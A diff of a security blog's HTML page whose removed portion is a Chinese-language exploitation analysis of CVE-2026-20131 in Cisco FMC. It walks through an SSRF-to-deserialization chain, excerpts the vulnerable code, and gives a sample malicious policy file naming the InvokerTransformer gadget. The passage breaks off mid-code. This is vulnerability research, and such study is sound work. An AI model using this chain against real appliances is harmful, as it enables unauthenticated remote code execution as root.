@@ -1,527 +1,180 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>Yayin&#39;s Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="专注于代码审计和漏洞挖掘的技术博客">
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Yayin's Blog - 代码审计 | 漏洞挖掘 | 安全研究</title><meta name="author" content="Yayin"><meta name="copyright" content="Yayin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="专注于代码审计和漏洞挖掘的技术博客">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Yayin&#39;s Blog">
 <meta property="og:url" content="https://yayin222.github.io/index.html">
 <meta property="og:site_name" content="Yayin&#39;s Blog">
 <meta property="og:description" content="专注于代码审计和漏洞挖掘的技术博客">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yayin222.github.io/images/avatar.png">
 <meta property="article:author" content="Yayin">
 <meta property="article:tag" content="代码审计,漏洞挖掘,安全研究,CVE">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Yayin's Blog" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
-<meta name="generator" content="Hexo 8.1.1"></head>
-
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Yayin&#39;s Blog</a>
-      </h1>
+<meta name="twitter:image" content="https://yayin222.github.io/images/avatar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Yayin's Blog",
+  "alternateName": [
+    "代码审计 | 漏洞挖掘 | 安全研究",
+    "yayin222.github.io"
+  ],
+  "url": "https://yayin222.github.io/"
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yayin222.github.io/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
       
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">代码审计 | 漏洞挖掘 | 安全研究</a>
-        </h2>
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
       
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://yayin222.github.io"></form>
-      </div>
-    </div>
-  </div>
-</header>
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
 
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-CVE-2026-20131-完整漏洞利用分析报告" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" class="article-date">
-  <time class="dt-published" datetime="2026-04-01T09:12:00.000Z" itemprop="datePublished">2026-04-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
-  </div>
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
 
-  </div>
-  <div class="article-inner">
+      const theme = saveToLocal.get('theme')
     
-    
-      <header class="article-header">
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
         
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">CVE-2026-20131 完整漏洞利用分析报告</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CVE-2026-20131-完整漏洞利用分析报告"><a href="#CVE-2026-20131-完整漏洞利用分析报告" class="headerlink" title="CVE-2026-20131 完整漏洞利用分析报告"></a>CVE-2026-20131 完整漏洞利用分析报告</h1><h2 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1. 漏洞概述"></a>1. 漏洞概述</h2><h3 id="1-1-基本信息"><a href="#1-1-基本信息" class="headerlink" title="1.1 基本信息"></a>1.1 基本信息</h3><table>
-<thead>
-<tr>
-<th>项目</th>
-<th>内容</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>CVE 编号</strong></td>
-<td>CVE-2026-20131</td>
-</tr>
-<tr>
-<td><strong>受影响产品</strong></td>
-<td>Cisco Firepower Management Center (FMC)</td>
-</tr>
-<tr>
-<td><strong>受影响版本</strong></td>
-<td>7.6.4 及之前版本（7.6.5 已修复）</td>
-</tr>
-<tr>
-<td><strong>漏洞类型</strong></td>
-<td>SSRF + 反序列化漏洞组合</td>
-</tr>
-<tr>
-<td><strong>CVSS 评分</strong></td>
-<td>预计 9.8 (Critical)</td>
-</tr>
-</tbody></table>
-<h3 id="1-2-漏洞本质"><a href="#1-2-漏洞本质" class="headerlink" title="1.2 漏洞本质"></a>1.2 漏洞本质</h3><p>这是一个<strong>组合漏洞</strong>，由两个独立但相互关联的问题组成：</p>
-<ol>
-<li><strong>SSRF（服务端请求伪造）</strong> - FMC 会从攻击者控制的 URL 加载 GWT RPC 序列化策略文件</li>
-<li><strong>不安全反序列化</strong> - 策略文件可配置启用 Java 原生反序列化，触发 CommonsCollections gadget 链</li>
-</ol>
-<h3 id="1-3-攻击效果"><a href="#1-3-攻击效果" class="headerlink" title="1.3 攻击效果"></a>1.3 攻击效果</h3><ul>
-<li>✅ 任意命令执行（RCE）</li>
-<li>✅ 以 Tomcat 进程权限运行（通常为 root）</li>
-<li>✅ 无需认证（部分接口）</li>
-</ul>
-<hr>
-<h2 id="2-漏洞位置"><a href="#2-漏洞位置" class="headerlink" title="2. 漏洞位置"></a>2. 漏洞位置</h2><h3 id="2-1-核心文件"><a href="#2-1-核心文件" class="headerlink" title="2.1 核心文件"></a>2.1 核心文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">FMC 文件系统路径:</span><br><span class="line">/var/opt/CSCOpx/MDC/tomcat/webapps/csm/WEB-INF/lib/</span><br><span class="line">├── web-server.jar</span><br><span class="line">│   └── com/cisco/nm/vms/rpc/common/</span><br><span class="line">│       ├── AbstractRPCImpl.java      ← SSRF 触发点</span><br><span class="line">│       └── CommonRPCImpl.java</span><br><span class="line">└── gwt-servlet.jar</span><br><span class="line">    └── com/google/gwt/user/server/rpc/</span><br><span class="line">        ├── SerializationPolicyLoader.java  ← 策略文件解析</span><br><span class="line">        ├── RPC.java                        ← GWT RPC 解码</span><br><span class="line">        └── impl/</span><br><span class="line">            ├── ServerSerializationStreamReader.java  ← 反序列化执行</span><br><span class="line">            ├── StandardSerializationPolicy.java      ← 策略实现</span><br><span class="line">            └── LegacySerializationPolicy.java</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-漏洞代码位置"><a href="#2-2-漏洞代码位置" class="headerlink" title="2.2 漏洞代码位置"></a>2.2 漏洞代码位置</h3><table>
-<thead>
-<tr>
-<th>文件</th>
-<th>行号</th>
-<th>功能</th>
-<th>风险</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>AbstractRPCImpl.java</code></td>
-<td>565-572</td>
-<td>从远程 URL 加载策略文件</td>
-<td>🔴 SSRF</td>
-</tr>
-<tr>
-<td><code>SerializationPolicyLoader.java</code></td>
-<td>63-76</td>
-<td>解析 @ClientFields</td>
-<td>🟡 配置解析</td>
-</tr>
-<tr>
-<td><code>ServerSerializationStreamReader.java</code></td>
-<td>268-281</td>
-<td>Java 原生反序列化</td>
-<td>🔴 RCE</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="3-完整利用链"><a href="#3-完整利用链" class="headerlink" title="3. 完整利用链"></a>3. 完整利用链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">│                        CVE-2026-20131 完整利用链                          │</span><br><span class="line">└─────────────────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌──────────────┐     ┌──────────────┐     ┌──────────────┐</span><br><span class="line">│   攻击者      │     │   恶意服务器   │     │   Cisco FMC  │</span><br><span class="line">│   (POC)      │     │              │     │  (受害者)     │</span><br><span class="line">└──────┬───────┘     └──────┬───────┘     └──────┬───────┘</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │ 1. 发送 GWT RPC 请求                     │</span><br><span class="line">       │    X-GWT-Module-Base:                   │</span><br><span class="line">       │    http://恶意服务器/internal/            │</span><br><span class="line">       │────────────────────────────────────────&gt;│</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 2. 解析请求         │</span><br><span class="line">       │                    │    发现远程策略 URL  │</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 3. SSRF 发起 HTTP GET│</span><br><span class="line">       │                    │    /internal/xxx.gwt.rpc</span><br><span class="line">       │                    │&lt;────────────────── │</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 4. 返回恶意策略文件  │</span><br><span class="line">       │                    │    (含@ClientFields)│</span><br><span class="line">       │                    │───────────────────&gt;│</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 5. 解析策略文件     │</span><br><span class="line">       │                    │    StandardSerializationPolicy</span><br><span class="line">       │                    │    clientFields 非 null</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 6. 反序列化参数     │</span><br><span class="line">       │                    │    deserializeClass()</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 7. Java 原生反序列化 │</span><br><span class="line">       │                    │    ObjectInputStream.readObject()</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │                    │ 8. 触发 Gadget 链   │</span><br><span class="line">       │                    │    InvokerTransformer</span><br><span class="line">       │                    │    → Runtime.exec() │</span><br><span class="line">       │                    │                    │</span><br><span class="line">       │ 9. 返回执行结果     │                    │</span><br><span class="line">       │&lt;─────────────────────────────────────────│</span><br><span class="line">       │                    │                    │</span><br><span class="line">       ▼                    ▼                    ▼</span><br><span class="line">    RCE!                日志记录              漏洞利用成功</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="4-关键代码分析"><a href="#4-关键代码分析" class="headerlink" title="4. 关键代码分析"></a>4. 关键代码分析</h2><h3 id="4-1-步骤-1-SSRF-触发-AbstractRPCImpl-java"><a href="#4-1-步骤-1-SSRF-触发-AbstractRPCImpl-java" class="headerlink" title="4.1 步骤 1: SSRF 触发 (AbstractRPCImpl.java)"></a>4.1 步骤 1: SSRF 触发 (AbstractRPCImpl.java)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：com/cisco/nm/vms/rpc/common/AbstractRPCImpl.java</span></span><br><span class="line"><span class="comment">// 行号：565-572</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> SerializationPolicy <span class="title function_">doGetSerializationPolicy</span><span class="params">(</span></span><br><span class="line"><span class="params">    HttpServletRequest request, </span></span><br><span class="line"><span class="params">    String moduleBaseURL, </span></span><br><span class="line"><span class="params">    String strongName)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">SerializationPolicy</span> <span class="variable">policy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 前面的代码尝试加载本地策略文件 ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 🔴 漏洞点：从远程 URL 加载策略文件</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">remoteURL</span> <span class="operator">=</span> SerializationPolicyLoader</span><br><span class="line">        .getSerializationPolicyFileName(moduleBaseURL + strongName);</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 直接使用用户控制的 moduleBaseURL 发起 HTTP 请求</span></span><br><span class="line">        is = <span class="keyword">new</span> <span class="title class_">URL</span>(remoteURL).openStream();  <span class="comment">// ← SSRF 触发点</span></span><br><span class="line">        policy = SerializationPolicyLoader.loadFromStream(is, (List)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable t2) &#123;</span><br><span class="line">        LogUtil.error(..., <span class="string">&quot;Failed to get remote SerializationPolicy!&quot;</span>, t2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击者控制点：</strong></p>
-<ul>
-<li><code>moduleBaseURL + strongName</code> 来自 HTTP Body 中的 GWT 反序列化协议规定的字段中</li>
-<li>攻击者可设置为 <code>http://恶意服务器/</code></li>
-</ul>
-<hr>
-<h3 id="4-2-步骤-2-策略文件解析-SerializationPolicyLoader-java"><a href="#4-2-步骤-2-策略文件解析-SerializationPolicyLoader-java" class="headerlink" title="4.2 步骤 2: 策略文件解析 (SerializationPolicyLoader.java)"></a>4.2 步骤 2: 策略文件解析 (SerializationPolicyLoader.java)</h3><p>策略文件是我们在恶意服务器中存放的内容，该文件实际上指定了GWT反序列化的白名单类，通过控制这个文件，我们可以在GWT反序列化协议中反序列化任意的类。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：com/google/gwt/user/server/rpc/SerializationPolicyLoader.java</span></span><br><span class="line"><span class="comment">// 行号：63-76, 109</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SerializationPolicy <span class="title function_">loadFromStream</span><span class="params">(</span></span><br><span class="line"><span class="params">    InputStream inputStream, </span></span><br><span class="line"><span class="params">    List&lt;ClassNotFoundException&gt; classNotFoundExceptions)</span> </span><br><span class="line">&#123;</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Boolean&gt; whitelistSer = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Boolean&gt; whitelistDeser = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Class&lt;?&gt;, String&gt; typeIds = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Class&lt;?&gt;, Set&lt;String&gt;&gt; clientFields = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">// ← 存储@ClientFields</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 逐行解析策略文件</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">lineNum</span> <span class="operator">=</span> <span class="number">1</span>; line != <span class="literal">null</span>; line = br.readLine(), ++lineNum) &#123;</span><br><span class="line">        String[] components = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 🟡 解析@ClientFields 行</span></span><br><span class="line">        <span class="keyword">if</span> (components[<span class="number">0</span>].equals(<span class="string">&quot;@ClientFields&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">binaryTypeName</span> <span class="operator">=</span> components[<span class="number">1</span>].trim();</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(binaryTypeName, <span class="literal">false</span>, contextClassLoader);</span><br><span class="line">            HashSet&lt;String&gt; fieldNames = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; components.length; ++i) &#123;</span><br><span class="line">                fieldNames.add(components[i]);  <span class="comment">// 字段名列表</span></span><br><span class="line">            &#125;</span><br><span class="line">            clientFields.put(clazz, fieldNames);  <span class="comment">// ← 存入 clientFields</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ... 解析普通类定义行 ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回 StandardSerializationPolicy（包含 clientFields）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StandardSerializationPolicy</span>(</span><br><span class="line">        whitelistSer, whitelistDeser, typeIds, clientFields);  <span class="comment">// ← 关键！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>策略文件格式示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 普通类定义</span><br><span class="line">java.lang.String,true,true,true,true,java.lang.String/2004016611,2004016611</span><br><span class="line">java.util.HashMap,true,true,true,true,java.util.HashMap/1797211028,1797211028</span><br><span class="line"></span><br><span class="line"># @ClientFields 定义 - 触发 Java 原生反序列化的关键</span><br><span class="line">@ClientFields,java.util.HashMap,field1,field2,field3</span><br><span class="line">@ClientFields,org.apache.commons.collections.functors.InvokerTransformer,methodName,iArgs</span><br></pre></td></tr></table></figure>
-
-<p><strong>ClientFields</strong> 的字面含义就是客户端字段表，在服务器解析的时候主要用来判断指定的类的哪些字段可以被反序列化，不过在这个漏洞利用中它的功能不重要，主要作用是负责在某个控制流分支中能够帮助我们走到漏洞sink点去。</p>
-<hr>
-<h3 id="4-3-步骤-3-GWT-RPC-反序列化-RPC-java"><a href="#4-3-步骤-3-GWT-RPC-反序列化-RPC-java" class="headerlink" title="4.3 步骤 3: GWT RPC 反序列化 (RPC.java)"></a>4.3 步骤 3: GWT RPC 反序列化 (RPC.java)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：com/google/gwt/user/server/rpc/RPC.java</span></span><br><span class="line"><span class="comment">// decodeRequest 方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> RPCRequest <span class="title function_">decodeRequest</span><span class="params">(</span></span><br><span class="line"><span class="params">    String encodedRequest, </span></span><br><span class="line"><span class="params">    Class&lt;?&gt; type, </span></span><br><span class="line"><span class="params">    SerializationPolicyProvider serializationPolicyProvider)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建流读取器</span></span><br><span class="line">    <span class="type">ServerSerializationStreamReader</span> <span class="variable">streamReader</span> <span class="operator">=</span> </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ServerSerializationStreamReader</span>(classLoader, serializationPolicyProvider);</span><br><span class="line">    streamReader.prepareToRead(encodedRequest);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取服务接口名、方法名、参数类型</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceIntfName</span> <span class="operator">=</span> streamReader.readString();</span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceMethodName</span> <span class="operator">=</span> streamReader.readString();</span><br><span class="line">    <span class="type">int</span> <span class="variable">paramCount</span> <span class="operator">=</span> streamReader.readInt();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取参数类型</span></span><br><span class="line">    Class&lt;?&gt;[] parameterTypes = <span class="keyword">new</span> <span class="title class_">Class</span>[paramCount];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; parameterTypes.length; ++i) &#123;</span><br><span class="line">        parameterTypes[i] = Class.forName(streamReader.readString());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 🔴 反序列化参数值 - 触发点</span></span><br><span class="line">    Object[] parameterValues = <span class="keyword">new</span> <span class="title class_">Object</span>[parameterTypes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; parameterValues.length; ++j) &#123;</span><br><span class="line">        parameterValues[j] = streamReader.deserializeValue(</span><br><span class="line">            parameterTypes[j], methodParameterTypes[j], resolvedTypes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RPCRequest</span>(method, parameterValues, ...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这是GWT RPC自己实现的反序列化功能，但它的反序列化只能通过类的构造函数来new一个新对象，在当前环境中暂时没找到什么类的构造函数可以利用，所以本质上，我们利用的是它反序列化的兜底操作，也就是java原生反序列化来触发漏洞。</p>
-<hr>
-<h3 id="4-4-步骤-4-Java-原生反序列化-ServerSerializationStreamReader-java"><a href="#4-4-步骤-4-Java-原生反序列化-ServerSerializationStreamReader-java" class="headerlink" title="4.4 步骤 4: Java 原生反序列化 (ServerSerializationStreamReader.java)"></a>4.4 步骤 4: Java 原生反序列化 (ServerSerializationStreamReader.java)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：com/google/gwt/user/server/rpc/impl/ServerSerializationStreamReader.java</span></span><br><span class="line"><span class="comment">// 行号：268-281</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">deserializeClass</span><span class="params">(</span></span><br><span class="line"><span class="params">    Class&lt;?&gt; instanceClass, </span></span><br><span class="line"><span class="params">    Object instance, </span></span><br><span class="line"><span class="params">    Type expectedType, </span></span><br><span class="line"><span class="params">    Type[] expectedParameterTypes, </span></span><br><span class="line"><span class="params">    DequeMap&lt;TypeVariable&lt;?&gt;, Type&gt; resolvedTypes)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 🟡 获取@ClientFields 定义的字段名</span></span><br><span class="line">    Set&lt;String&gt; clientFieldNames = </span><br><span class="line">        <span class="built_in">this</span>.serializationPolicy.getClientFieldNamesForEnhancedClass(instanceClass);</span><br><span class="line">    </span><br><span class="line">    